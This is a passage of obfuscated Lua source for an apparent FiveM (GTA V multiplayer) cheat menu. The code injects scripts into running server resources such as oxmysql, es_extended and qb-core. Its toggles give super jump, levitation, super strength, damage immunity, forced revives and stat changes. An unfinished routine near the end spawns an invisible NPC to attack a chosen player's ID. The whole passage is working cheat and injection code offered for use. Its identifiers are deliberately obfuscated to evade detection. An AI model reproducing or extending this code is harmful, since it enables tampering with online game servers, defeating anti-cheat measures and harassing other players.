                        while g_FreecamFeatureEnabled and not Unloaded do Wait(0)
                            if IsDisabledControlJustPressed(0, 74) then -- H key
                                if isFreecamActive then stopFreecam()
                                else startFreecam() end
                            end
                        end
                    end)
                end
                
                initializeFreecam()
            ]]);end,function() MachoInjectResource((v47("core") and "core") or (v47("es_extended") and "es_extended") or (v47("qb-core") and "qb-core") or (v47("monitor") and "monitor") or "any" ,[[
                g_FreecamFeatureEnabled = false
                if isFreecamActive and stopFreecam then stopFreecam() end
            ]]);end);MachoMenuCheckbox(v38[96 -(51 + 44) ],"Super Jump",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if xCvBnMqWeRtYuIo == nil then xCvBnMqWeRtYuIo = false end
                xCvBnMqWeRtYuIo = true

                local function JcWT5vYEq1()
                    local yLkPwOiUtReAzXc = CreateThread
                    yLkPwOiUtReAzXc(function()
                        while xCvBnMqWeRtYuIo and not Unloaded do
                            local hGfDsAzXcVbNmQw = SetSuperJumpThisFrame
                            local eRtYuIoPaSdFgHj = PlayerPedId()
                            local oPlMnBvCxZlKjHg = PlayerId()

                            hGfDsAzXcVbNmQw(oPlMnBvCxZlKjHg)
                            Wait(0)
                        end
                    end)
                end

                JcWT5vYEq1()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                xCvBnMqWeRtYuIo = false
            ]]);end);MachoMenuCheckbox(v38[1 + 0 ],"Levitation",function() local v178=1317 -(1114 + 203) ;while true do if (0==v178) then MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                -- make helpers global so other chunks can use them
                function ScaleVector(vect, mult)
                    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
                end

                function AddVectors(vect1, vect2)
                    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
                end

                function ApplyForce(entity, direction)
                    local XroXTNEFqxoWfH = ApplyForceToEntity
                    XroXTNEFqxoWfH(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
                end

                function SubVectors(vect1, vect2)
                    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
                end

                function Oscillate(entity, position, angleFreq, dampRatio)
                    local OBaTQqteIpmZVo = GetEntityVelocity
                    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
                    local pos2 = AddVectors(ScaleVector(OBaTQqteIpmZVo(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
                    local targetPos = SubVectors(pos1, pos2)
                    ApplyForce(entity, targetPos)
                end

                function RotationToDirection(rot)
                    local radZ = math.rad(rot.z)
                    local radX = math.rad(rot.x)
                    local cosX = math.cos(radX)
                    return vector3(
                        -math.sin(radZ) * cosX,
                        math.cos(radZ) * cosX,
                        math.sin(radX)
                    )
                end

                function GetClosestCoordOnLine(startCoords, endCoords, entity)
                    local CDGcdMQhosGVCf = GetShapeTestResult
                    local UaWIFHgeizhHua = StartShapeTestRay
                    local result, hit, hitCoords, surfaceNormal, entityHit =
                        CDGcdMQhosGVCf(UaWIFHgeizhHua(startCoords.x, startCoords.y, startCoords.z, endCoords.x, endCoords.y, endCoords.z, -1, entity, 0))
                    return hit == 1, hitCoords
                end

                function GetCameraLookingAtCoord(distance)
                    local playerPed = PlayerPedId()
                    local camRot = GetGameplayCamRot(2)
                    local camCoord = GetGameplayCamCoord()
                    local forwardVector = RotationToDirection(camRot)
                    local destination = vector3(
                        camCoord.x + forwardVector.x * distance,
                        camCoord.y + forwardVector.y * distance,
                        camCoord.z + forwardVector.z * distance
                    )
                    local hit, endCoords = GetClosestCoordOnLine(camCoord, destination, playerPed)
                    if hit then return endCoords else return destination end
                end
            ]]);MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function awfjawr57awt7f()
                    nxtBFlQWMMeRLs = true

                    local jIiIfikctHYrlH = CreateThread
                    jIiIfikctHYrlH(function()
                        while nxtBFlQWMMeRLs and not Unloaded do
                            Wait(0)
                            local ped = PlayerPedId()

                            local SZxuJlyJQmGlZz = SetPedCanRagdoll
                            local valuOZfymjeVaH = IsEntityPlayingAnim
                            local IiHiLVRagMQhrn = RequestAnimDict
                            local mOZOquvggdnbod = HasAnimDictLoaded
                            local UFZdrZNXpLwpjT = TaskPlayAnim
                            local cQPIZtKyyWaVcY = GetCameraLookingAtCoord
                            local OyvuuAMyvjtIzD = GetGameplayCamRot
                            local XKWvPIkCKMXIfR = IsDisabledControlPressed  -- FIXED: missing '='

                            while XKWvPIkCKMXIfR(0, 22) do
                                SZxuJlyJQmGlZz(ped, false)

                                if not valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                                    IiHiLVRagMQhrn("oddjobs@assassinate@construction@")
                                    while not mOZOquvggdnbod("oddjobs@assassinate@construction@") do
                                        Wait(0)
                                    end
                                    UFZdrZNXpLwpjT(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms",
                                        8.0, -8.0, -1, 49, 0, false, false, false)
                                end

                                local camRot = OyvuuAMyvjtIzD(2)
                                local camHeading = (camRot.z + 360) % 360
                                local direction = cQPIZtKyyWaVcY(77)

                                SetEntityHeading(ped, camHeading)
                                Oscillate(ped, direction, 0.33, 0.9)

                                Wait(1)
                            end

                            if valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                                ClearPedTasks(ped)
                            end

                            SZxuJlyJQmGlZz(ped, true)
                        end
                    end)
                end

                awfjawr57awt7f()
            ]]);break;end end end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                nxtBFlQWMMeRLs = false
                ClearPedTasks(PlayerPedId())
            ]]);end);MachoMenuCheckbox(v38[727 -(228 + 498) ],"Super Strength",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if fgawjFmaDjdALaO == nil then fgawjFmaDjdALaO = false end
                fgawjFmaDjdALaO = true

                local holdingEntity = false
                local holdingCarEntity = false
                local holdingPed = false
                local heldEntity = nil
                local entityType = nil
                local awfhjawrasfs = CreateThread

                awfhjawrasfs(function()
                    while fgawjFmaDjdALaO and not Unloaded do
                        Wait(0)
                        if holdingEntity and heldEntity then
                            local playerPed = PlayerPedId()
                            local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                            DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped")
                            
                            if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                                RequestAnimDict('anim@mp_rollarcoaster')
                                while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                                    Wait(100)
                                end
                                TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                            elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                                RequestAnimDict('anim@heists@box_carry@')
                                while not HasAnimDictLoaded('anim@heists@box_carry@') do
                                    Wait(100)
                                end
                                TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                            end

                            if not IsEntityAttached(heldEntity) then
                                holdingEntity = false
                                holdingCarEntity = false
                                holdingPed = false
                                heldEntity = nil
                            end
                        end
                    end
                end)

                awfhjawrasfs(function()
                    while fgawjFmaDjdALaO and not Unloaded do
                        Wait(0)
                        local playerPed = PlayerPedId()
                        local camPos = GetGameplayCamCoord()
                        local camRot = GetGameplayCamRot(2)
                        local direction = RotationToDirection(camRot)
                        local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)

                        local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                        local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                        local validTarget = false

                        if hit == 1 then
                            entityType = GetEntityType(entityHit)
                            if entityType == 3 or entityType == 2 or entityType == 1 then
                                validTarget = true
                                local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                                DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[E] Pick Up / [Y] Drop")
                            end
                        end

                        if IsDisabledControlJustReleased(0, 38) then
                            if validTarget and not holdingEntity then
                                holdingEntity = true
                                heldEntity = entityHit

                                local wfuawruawts = AttachEntityToEntity

                                if entityType == 3 then
                                    wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                                elseif entityType == 2 then
                                    holdingCarEntity = true
                                    wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                elseif entityType == 1 then
                                    holdingPed = true
                                    wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                end
                            end
                        elseif IsDisabledControlJustReleased(0, 246) then
                            if holdingEntity then
                                local wgfawhtawrs = DetachEntity
                                local dfgjsdfuwer = ApplyForceToEntity
                                local sdgfhjwserw = ClearPedTasks

                                wgfawhtawrs(heldEntity, true, true)
                                dfgjsdfuwer(heldEntity, 1, direction.x * 500, direction.y * 500, direction.z * 500, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                holdingEntity = false
                                holdingCarEntity = false
                                holdingPed = false
                                heldEntity = nil
                                sdgfhjwserw(PlayerPedId())
                            end
                        end
                    end
                end)

                function RotationToDirection(rotation)
                    local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                    local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                    return direction
                end

                function DrawText3Ds(x, y, z, text)
                    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
                    local px, py, pz = table.unpack(GetGameplayCamCoords())
                    local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
                    local fov = (1 / GetGameplayCamFov()) * 100
                    scale = scale * fov

                    if onScreen then
                        SetTextScale(0.0 * scale, 0.35 * scale)
                        SetTextFont(0)
                        SetTextProportional(1)
                        SetTextColour(255, 255, 255, 215)
                        SetTextDropshadow(0, 0, 0, 0, 155)
                        SetTextEdge(2, 0, 0, 0, 150)
                        SetTextDropShadow()
                        -- SetTextOutline()
                        SetTextEntry("STRING")
                        SetTextCentre(1)
                        AddTextComponentString(text)
                        DrawText(_x, _y)
                    end
                end
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                fgawjFmaDjdALaO = false
            ]]);end);MachoMenuCheckbox(v38[1 + 0 ],"Super Punch",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if qWeRtYuIoPlMnBv == nil then qWeRtYuIoPlMnBv = false end
                qWeRtYuIoPlMnBv = true

                local function NdaFBuHkvo()
                    local uTrEsAzXcVbNmQw = CreateThread
                    uTrEsAzXcVbNmQw(function()
                        while qWeRtYuIoPlMnBv and not Unloaded do
                            local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
                            local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
                            local bNmQwErTyUiOpAs = SetWeaponDamageModifier
                            local sDfGhJkLqWeRtYu = PlayerId()
                            local DamageRateValue = 150.0
                            local WeaponNameForDamage = "WEAPON_UNARMED"


                            nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, DamageRateValue)
                            cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, DamageRateValue)
                            bNmQwErTyUiOpAs(GetHashKey(WeaponNameForDamage), DamageRateValue)

                            Wait(0)
                        end
                    end)
                end

                NdaFBuHkvo()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local qWeRtYuIoPlMnBv = false
                local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
                local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
                local bNmQwErTyUiOpAs = SetWeaponDamageModifier
                local sDfGhJkLqWeRtYu = PlayerId()

                nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, 1.0)
                cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, 1.0)
                bNmQwErTyUiOpAs(GetHashKey("WEAPON_UNARMED"), 1.0)
            ]]);end);MachoMenuCheckbox(v38[1],"Throw From Vehicle",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if zXpQwErTyUiPlMn == nil then zXpQwErTyUiPlMn = false end
                zXpQwErTyUiPlMn = true

                local function qXzRP7ytKW()
                    local iLkMzXvBnQwSaTr = CreateThread
                    iLkMzXvBnQwSaTr(function()
                        while zXpQwErTyUiPlMn and not Unloaded do
                            local vBnMaSdFgTrEqWx = SetRelationshipBetweenGroups
                            vBnMaSdFgTrEqWx(5, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                            Wait(0)
                        end
                    end)
                end

                qXzRP7ytKW()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                zXpQwErTyUiPlMn = false
            ]]);end);MachoMenuCheckbox(v38[1 + 0 ],"Force Third Person",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                kJfGhTrEeWqAsDz = true

                local function pqkTRWZ38y()
                    local gKdNqLpYxMiV = CreateThread
                    gKdNqLpYxMiV(function()
                        while kJfGhTrEeWqAsDz and not Unloaded do
                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                            qWeRtYuIoPlMnBv(0)
                            aSdFgHjKlQwErTy(0)
                            Wait(0)
                        end
                    end)
                end

                pqkTRWZ38y()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                kJfGhTrEeWqAsDz = false
            ]]);end);MachoMenuCheckbox(v38[664 -(174 + 489) ],"Force Driveby",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                zXcVbNmQwErTyUi = true

                local function UEvLBcXqM6()
                    local cVbNmAsDfGhJkLz = CreateThread
                    cVbNmAsDfGhJkLz(function()
                        while zXcVbNmQwErTyUi and not Unloaded do
                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                            local eRtYuIoPaSdFgHi = PlayerPedId()

                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                            Wait(0)
                        end
                    end)
                end

                UEvLBcXqM6()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                zXcVbNmQwErTyUi = false
            ]]);end);MachoMenuCheckbox(v38[2 -1 ],"Anti-Headshot",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if yHnvrVNkoOvGMWiS == nil then yHnvrVNkoOvGMWiS = false end
                yHnvrVNkoOvGMWiS = true

                local eeitKYqDwYbPslTW = CreateThread
                local function LIfbdMbeIAeHTnnx()
                    eeitKYqDwYbPslTW(function()
                        while yHnvrVNkoOvGMWiS and not Unloaded do
                            local fhw72q35d8sfj = SetPedSuffersCriticalHits
                            fhw72q35d8sfj(PlayerPedId(), false)
                            Wait(0)
                        end
                    end)
                end

                LIfbdMbeIAeHTnnx()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                yHnvrVNkoOvGMWiS = false
                fhw72q35d8sfj(PlayerPedId(), true)
            ]]);end);MachoMenuCheckbox(v38[1906 -(830 + 1075) ],"Anti-Freeze",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if nHgFdSaZxCvBnMq == nil then nHgFdSaZxCvBnMq = false end
                nHgFdSaZxCvBnMq = true

                local sdfw3w3tsdg = CreateThread
                local function XELa6FJtsB()
                    sdfw3w3tsdg(function()
                        while nHgFdSaZxCvBnMq and not Unloaded do
                            local fhw72q35d8sfj = FreezeEntityPosition
                            local segfhs347dsgf = ClearPedTasks

                            if IsEntityPositionFrozen(PlayerPedId()) then
                                fhw72q35d8sfj(PlayerPedId(), false)
                                segfhs347dsgf(PlayerPedId())
                            end
                            
                            Wait(0)
                        end
                    end)
                end

                XELa6FJtsB()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                nHgFdSaZxCvBnMq = false
            ]]);end);MachoMenuCheckbox(v38[525 -(303 + 221) ],"Anti-Blackscreen",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if aDjsfmansdjwAEl == nil then aDjsfmansdjwAEl = false end
                aDjsfmansdjwAEl = true

                local sdfw3w3tsdg = CreateThread
                local function XELWAEDa6FJtsB()
                    sdfw3w3tsdg(function()
                        while aDjsfmansdjwAEl and not Unloaded do
                            DoScreenFadeIn(0)
                            Wait(0)
                        end
                    end)
                end

                XELWAEDa6FJtsB()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                aDjsfmansdjwAEl = false
            ]]);end);local v49=MachoMenuInputbox(v38[1271 -(231 + 1038) ],"Model Name:","...");MachoMenuButton(v38[2],"Change Model",function() local v179=0;local v180;while true do if (v179==0) then v180=MachoMenuGetInputbox(v49);if ((type(v180)=="string") and (v180~="")) then local v350=0 + 0 ;local v351;while true do if (v350==(1162 -(171 + 991))) then v351=string.format([[
                    local function GykR8qjWTp()
                        local nHgFdSaZxCvBnMq = RequestModel
                        local xCvBnMqWeRtYuIo = HasModelLoaded
                        local aSdFgHjKlQwErTy = SetPlayerModel
                        local oPlMnBvCxZlKjHg = SetPedDefaultComponentVariation

                        nHgFdSaZxCvBnMq(GetHashKey("%s"))
                        while not xCvBnMqWeRtYuIo(GetHashKey("%s")) do
                            Wait(1)
                        end
                        
                        aSdFgHjKlQwErTy(PlayerId(), GetHashKey("%s"))
                        oPlMnBvCxZlKjHg(PlayerPedId())
                    end

                    GykR8qjWTp()
                ]],v180,v180,v180);MachoInjectResource((v47("oxmysql") and "oxmysql") or "any" ,v351);break;end end end break;end end end);MachoMenuButton(v38[8 -6 ],"White Thug Drip",function() local v181=0 -0 ;while true do if (v181==0) then function WhiteThugDrip() local v327=0 -0 ;local v328;while true do if (v327==(3 + 0)) then SetPedPropIndex(v328,0 -0 ,2 -1 ,0,true);break;end if (v327==(1 -0)) then SetPedComponentVariation(v328,24 -16 ,15,0,1250 -(111 + 1137) );SetPedComponentVariation(v328,3,5,158 -(91 + 67) ,2);v327=5 -3 ;end if (v327==(1 + 1)) then SetPedComponentVariation(v328,527 -(423 + 100) ,56,0,1 + 1 );SetPedComponentVariation(v328,16 -10 ,10 + 9 ,771 -(326 + 445) ,8 -6 );v327=6 -3 ;end if ((0 -0)==v327) then v328=PlayerPedId();SetPedComponentVariation(v328,11,109,711 -(530 + 181) ,883 -(614 + 267) );v327=1;end end end WhiteThugDrip();break;end end end);MachoMenuButton(v38[34 -(19 + 13) ],"JTG Mafia Drip",function() local v182=0;while true do if (0==v182) then function JTGMafia() local v329=PlayerPedId();SetPedComponentVariation(v329,17 -6 ,11 -6 ,0,5 -3 );SetPedComponentVariation(v329,8,15,0 + 0 ,3 -1 );SetPedComponentVariation(v329,6 -3 ,5,0,2);SetPedComponentVariation(v329,1816 -(1293 + 519) ,42,0,3 -1 );SetPedComponentVariation(v329,15 -9 ,11 -5 ,0 -0 ,4 -2 );SetPedPropIndex(v329,0,14 + 12 ,0 + 0 ,true);SetPedPropIndex(v329,2 -1 ,1 + 2 ,0 + 0 ,true);end JTGMafia();break;end end end);MachoMenuButton(v38[2 + 1 ],"Heal",function() SetEntityHealth(PlayerPedId(),200);end);MachoMenuButton(v38[3],"Armor",function() SetPedArmour(PlayerPedId(),1196 -(709 + 387) );end);MachoMenuButton(v38[3],"Fill Hunger",function() MachoInjectResource2(1861 -(673 + 1185) ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function DawrjatjsfAW()
                    TriggerEvent('esx_status:set', 'hunger', 1000000)
                end

                DawrjatjsfAW()
            ]]);end);MachoMenuButton(v38[8 -5 ],"Fill Thirst",function() MachoInjectResource2(3,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function sWj238fsMAw()
                    TriggerEvent('esx_status:set', 'thirst', 1000000)
                end

                sWj238fsMAw()
            ]]);end);MachoMenuButton(v38[9 -6 ],"Revive",function() MachoInjectResource2(4 -1 ,(v47("ox_inventory") and "ox_inventory") or (v47("ox_lib") and "ox_lib") or (v47("es_extended") and "es_extended") or (v47("qb-core") and "qb-core") or (v47("wasabi_ambulance") and "wasabi_ambulance") or (v47("ak47_ambulancejob") and "ak47_ambulancejob") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function AcjU5NQzKw()
                    if GetResourceState('prp-injuries') == 'started' then
                        TriggerEvent('prp-injuries:hospitalBedHeal', skipHeal)
                        return
                    end

                    if GetResourceState('es_extended') == 'started' then
                        TriggerEvent("esx_ambulancejob:revive")
                        return
                    end

                    if GetResourceState('qb-core') == 'started' then
                        TriggerEvent("hospital:client:Revive")
                        return
                    end

                    if GetResourceState('wasabi_ambulance') == 'started' then
                        TriggerEvent("wasabi_ambulance:revive")
                        return
                    end

                    if GetResourceState('ak47_ambulancejob') == 'started' then
                        TriggerEvent("ak47_ambulancejob:revive")
                        return
                    end

                    NcVbXzQwErTyUiO = GetEntityHeading(PlayerPedId())
                    BvCxZlKjHgFdSaP = GetEntityCoords(PlayerPedId())

                    RtYuIoPlMnBvCxZ = NetworkResurrectLocalPlayer
                    RtYuIoPlMnBvCxZ(BvCxZlKjHgFdSaP.x, BvCxZlKjHgFdSaP.y, BvCxZlKjHgFdSaP.z, NcVbXzQwErTyUiO, false, false, false, 1, 0)
                end

                AcjU5NQzKw()
            ]]);end);MachoMenuButton(v38[3 + 0 ],"Suicide",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function RGybF0JqEt()
                    local aSdFgHjKlQwErTy = SetEntityHealth
                    aSdFgHjKlQwErTy(PlayerPedId(), 0)
                end

                RGybF0JqEt()
            ]]);end);MachoMenuButton(v38[3],"Force Ragdoll",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function awfAEDSADWEf()
                    local cWAmdjakwDksFD = SetPedToRagdoll
                    cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                end

                awfAEDSADWEf()
            ]]);end);MachoMenuButton(v38[3],"Clear Task",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function iPfT7kN3dU()
                    local zXcVbNmAsDfGhJk = ClearPedTasksImmediately
                    zXcVbNmAsDfGhJk(PlayerPedId())
                end

                iPfT7kN3dU()
            ]]);end);MachoMenuButton(v38[3 + 0 ],"Clear Vision",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function MsVqZ29ptY()
                    local qWeRtYuIoPlMnBv = ClearTimecycleModifier
                    local kJfGhTrEeWqAsDz = ClearExtraTimecycleModifier

                    qWeRtYuIoPlMnBv()
                    kJfGhTrEeWqAsDz()
                end

                MsVqZ29ptY()
            ]]);end);MachoMenuButton(v38[3 -0 ],"Randomize Outfit",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function UxrKYLp378()
                    local UwEsDxCfVbGtHy = PlayerPedId
                    local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                    local QwAzXsEdCrVfBg = SetPedComponentVariation
                    local LkJhGfDsAqWeRt = SetPedHeadBlendData
                    local MnBgVfCdXsZaQw = SetPedHairColor
                    local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                    local TyUiOpAsDfGhJk = SetPedHeadOverlay
                    local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                    local DfGhJkLzXcVbNm = ClearPedProp

                    local function PqLoMzNkXjWvRu(component, exclude)
                        local ped = UwEsDxCfVbGtHy()
                        local total = FdSaQwErTyUiOp(ped, component)
                        if total <= 1 then return 0 end
                        local choice = exclude
                        while choice == exclude do
                            choice = math.random(0, total - 1)
                        end
                        return choice
                    end

                    local function OxVnBmCxZaSqWe(component)
                        local ped = UwEsDxCfVbGtHy()
                        local total = FdSaQwErTyUiOp(ped, component)
                        return total > 1 and math.random(0, total - 1) or 0
                    end

                    local ped = UwEsDxCfVbGtHy()

                    QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                    QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                    QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                    QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                    QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                    local face = math.random(0, 45)
                    local skin = math.random(0, 45)
                    LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                    local hairMax = FdSaQwErTyUiOp(ped, 2)
                    local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                    QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                    MnBgVfCdXsZaQw(ped, 0, 0)

                    local brows = RtYuIoPlMnBvCx(2)
                    TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                    ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                    DfGhJkLzXcVbNm(ped, 0)
                    DfGhJkLzXcVbNm(ped, 1)
                end

                UxrKYLp378()
            ]]);end);local v50=nil;local v51=nil;local v52=nil;local v53=false;local v54=false;local v55=true;local function v56(v183) local v184=0 + 0 ;local v185;while true do if (0==v184) then v185=GetEntityForwardVector(v183);return vector3( -v185.y,v185.x,0 -0 );end end end function KeyboardInput(v186,v187,v188) local v189=0 -0 ;while true do if (v189==(1880 -(446 + 1434))) then AddTextEntry("FMMC_KEY_TIP1",v186);DisplayOnscreenKeyboard(1284 -(1040 + 243) ,"FMMC_KEY_TIP1","",v187,"","","",v188);v189=1;end if (v189==1) then while (UpdateOnscreenKeyboard()~=(2 -1)) and (UpdateOnscreenKeyboard()~=(1849 -(559 + 1288)))  do Wait(1931 -(609 + 1322) );end if (UpdateOnscreenKeyboard()~=(456 -(13 + 441))) then return GetOnscreenKeyboardResult();else return nil;end break;end end end function StartAttack() local v190=0;local v191;local v192;local v193;local v194;local v195;local v196;local v197;while true do if (v190==3) then NetworkSetEntityInvisibleToNetwork(v50,true);SetBlockingOfNonTemporaryEvents(v50,true);SetPedFleeAttributes(v50,0,0 -0 );SetPedCombatAttributes(v50,13 -8 ,true);SetEntityProofs(v50,false,false,false,false,false,false,false,true);SetPedRelationshipGroupHash(v50,GetHashKey("stealthnpc"));v190=19 -15 ;end if ((1 + 1)==v190) then RequestModel(v196);while  not HasModelLoaded(v196) do Wait(363 -263 );end v197=GetEntityCoords(v194) + vector3(2,2,0) ;v50=CreatePed(2 + 2 ,v196,v197,0 + 0 ,false,false);SetEntityVisible(v50,true,false);SetEntityLocallyInvisible(v50);v190=8 -5 ;end if (v190==(1 + 0)) then v195=GetVehiclePedIsIn(v194,false);if (v195==(0 -0)) then local v352=0 + 0 ;while true do if (v352==(0 + 0)) then print("You are not in a vehicle.");return;end end end TaskLeaveVehicle(v194,v195,0);Wait(1797 + 703 );ClearPedTasksImmediately(PlayerPedId());v196="mp_m_freemode_01";v190=2 + 0 ;end if (v190==(5 + 0)) then v52=v193;v53=true;print("NPC has started attacking.");break;end if (v190==(433 -(153 + 280))) then v191=KeyboardInput("Enter player ID to attack","",11 -7 );v192=tonumber(v191);if  not v192 then print("Invalid player ID.");return;end v193=GetPlayerPed(GetPlayerFromServerId(v192));if  not DoesEntityExist(v193) then print("Player not found.");return;end v194=PlayerPedId();v190=1;end if ((4 + 0)==v190) then SetDriverAbility(v50,1 + 0 );SetDriverAggressiveness(v50,1 + 0 );TaskWarpPedIntoVehicle(v50,v195, -(1 + 0));Wait(250);v51=v195;SetVehicleEngineOn(v51,true,true,false);v190=4 + 1 ;end end end function StopAttack() local v198=0 -0 ;while true do if (v198==(2 + 0)) then v51=nil;print("NPC and vehicle deleted.");break;end if (v198==1) then v50=nil;if (v51 and DoesEntityExist(v51)) then local v353=667 -(89 + 578) ;while true do if (v353==(0 + 0)) then 